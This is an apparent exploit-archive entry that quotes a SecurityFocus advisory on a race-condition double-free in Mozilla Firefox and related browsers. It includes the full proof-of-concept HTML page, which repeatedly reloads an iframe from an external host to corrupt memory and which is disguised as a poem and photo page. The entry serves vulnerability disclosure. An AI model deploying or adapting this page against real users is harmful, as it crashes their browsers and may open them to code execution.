@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/19534/info
+
+Mozilla Firefox is prone to a remote memory-corruption vulnerability because of a race condition that may result in double-free or other memory-corruption issues.
+
+Attackers may likely exploit this issue to execute arbitrary machine code in the context of the vulnerable application, but this has not been confirmed. Failed exploit attempts will likely crash the application.
+
+Mozilla Firefox is vulnerable to this issue. Due to code-reuse, other Mozilla products are also likely affected.
+
+The Flock browser version 0.7.4.1 and the K-Meleon browser version 1.0.1 are also reported vulnerable.
+
+<html> <body bgcolor=black text=white onload="javascript:foo()"> <script> <!-- counter = 0; function foo() { if (counter < 20) { document.getElementById('foo').src = "http://lcamtuf.coredump.cx/ffoxdie3_i.html?" +Math.random(); setTimeout('foo()',10 * counter); counter++; } else { document.getElementById('foo').src = "http://lcamtuf.coredump.cx/ffoxdie_ok.html"; } } // --> </script> <img src="http://lcamtuf.coredump.cx/photo/current/ula4-6.jpg" style="border-style: solid; border-width: 1px; border-color: #804040" align=right> <font face="tahoma, helvetica, arial"> <font color=lightblue> Tyger, Tyger. burning bright<br> In the forests of the night,<br> What immortal hand or eye<br> Could frame thy fearful symmetry? </font> <p> <b>Please wait approx. 20 seconds...</b> <br> <iframe id=foo> </iframe> <p> <font color=gray> Javascript is required.<br> Firefox is required.<br> May fail on a spotty link.<br> Common sense is advised.<br> <p> More photos: <a href=/photo/current/>click here</a> </font> </font> </body> </html>
